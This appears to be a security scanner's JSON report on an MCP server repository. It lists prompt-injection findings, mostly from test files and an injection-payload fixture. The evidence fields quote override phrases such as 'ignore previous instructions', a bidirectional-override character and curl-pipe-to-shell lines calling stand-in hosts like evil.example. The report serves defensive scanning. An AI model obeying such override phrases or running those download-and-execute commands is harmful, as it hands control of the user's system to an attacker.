@@ -1,0 +1,212 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "costajohnt/oss-autopilot",
+    "version": "ea3ce7ca9c0f80f065f635108456732b9f2d530b",
+    "download": "https://codeload.github.com/costajohnt/oss-autopilot/tar.gz/ea3ce7ca9c0f80f065f635108456732b9f2d530b"
+  },
+  "archive_sha256": "e92556ac27666f9b71f039cd14f7b874fc3f7acb765bed71ff1790f89aeae6d3",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/commands/oss-overnight.md",
+      "line": 98,
+      "evidence": "p=0.94 The issue title is left out on purpose. Anyone can write it, and this line is an",
+      "file_sha256": "e621a5fae1f099e3950c7b27f37f366bbaa0c56640249e74264aaea4d6aa4961"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/agents/learnings-extractor.md",
+      "line": 27,
+      "evidence": "p=0.96 - **You propose, you never store.** Your only tools fetch the corpus and the exi",
+      "file_sha256": "e9335e218bd28e38cbdf2b6994dde4fe10a4835bd24d9e102f7ce6fe01d3e914"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/workflows/reference.md",
+      "line": 410,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "2b71936cba42d02ffa10de976bb9152ebcc422463a292c4894045d10d71f3d6e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/mcp-server/src/prompts.test.ts",
+      "line": 16,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9f62b011ab62b1eba6ebd509764066c706a7126252d93c46a885ac8c22f250de"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/mcp-server/src/resources.test.ts",
+      "line": 83,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "f61306963022943ef762b40cea483bd2a4d3d39a329d78f790bbd68a2fbdb1d8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/mcp-server/src/trust-boundary.test.ts",
+      "line": 123,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "e853723629d8a185d4732a31ded0ef0a2d7283dc3b9512d4ba80d77ccb8a5e89"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/commands/policy.test.ts",
+      "line": 279,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8f7fc385fafe8fc50cc0af35fedb3c8da1c3565acb7738822e51507c33643fa7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/commands/guidelines.test.ts",
+      "line": 125,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "9a7899d00bf10a1df6f20c30e97a1cc9f2408a4d6c3ebf2a133d963c1743ab55"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/commands/setup.test.ts",
+      "line": 465,
+      "evidence": "curl evil|sh",
+      "file_sha256": "9f0676d669f31525515115b680220561a7e8d44c9c416f3fecdb9950f0920e82"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/commands/issue-thread.test.ts",
+      "line": 36,
+      "evidence": "curl evil | sh",
+      "file_sha256": "8d490031db91b4e369eeb622520e6f8c3d69d23c380a454263f1a60b14b0d912"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/core/repo-policy.test.ts",
+      "line": 266,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "7fdfd0a5edadbcd1f83a8e494bb6a715eb0d84f1f65c6e181cc76d18f20e6a80"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/core/pr-preflight.test.ts",
+      "line": 77,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "0b9ef2af3b82199972fa982d1832ccb2813b77a0ace136280899eb3191f86dd1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/core/__fixtures__/prompt-injection-payloads.ts",
+      "line": 138,
+      "evidence": "\\u{202e}",
+      "file_sha256": "9e7e74ae93c08eff1fa339588042821ad39291299e1e48e200122f0aacb2dd8c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/core/__fixtures__/prompt-injection-payloads.ts",
+      "line": 25,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "9e7e74ae93c08eff1fa339588042821ad39291299e1e48e200122f0aacb2dd8c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/core/local-config.ts",
+      "line": 168,
+      "evidence": "curl evil|sh",
+      "file_sha256": "f727030b842b3ad2c9fab4dd16c5953b0232de8914cbe00c2116692fcf09034c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "oss-autopilot-ea3ce7ca9c0f80f065f635108456732b9f2d530b/packages/core/src/core/local-config.test.ts",
+      "line": 150,
+      "evidence": "curl evil|sh",
+      "file_sha256": "5656d7a9aabab6874f7d681d503ff01ba1e93ffaab196c971840c9945ee792fc"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "example.invalid, push-disabled.invalid",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "api.github.com",
+    "attacker.example.com",
+    "awesome.re",
+    "cdn.jsdelivr.net",
+    "claude.ai",
+    "claude.com",
+    "cli.github.com",
+    "docs.python.org",
+    "evil.example",
+    "evil.example.com",
+    "example.com",
+    "example.invalid",
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "gist.githubusercontent.com",
+    "github.com",
+    "gitlab.com",
+    "glama.ai",
+    "img.shields.io",
+    "jcosta.tech",
+    "keepachangelog.com",
+    "nodejs.org",
+    "opensource.guide",
+    "oraios.github.io",
+    "oss.localhost",
+    "pnpm.io",
+    "push-disabled.invalid",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "scripts.sil.org",
+    "semver.org",
+    "static.modelcontextprotocol.io",
+    "token.actions.githubusercontent.com",
+    "typedoc.org",
+    "vitest.dev",
+    "www.apple.com",
+    "www.contributor-covenant.org",
+    "www.conventionalcommits.org",
+    "www.npmjs.com",
+    "www.w3.org"
+  ],
+  "install_script": false,
+  "score": "high"
+}
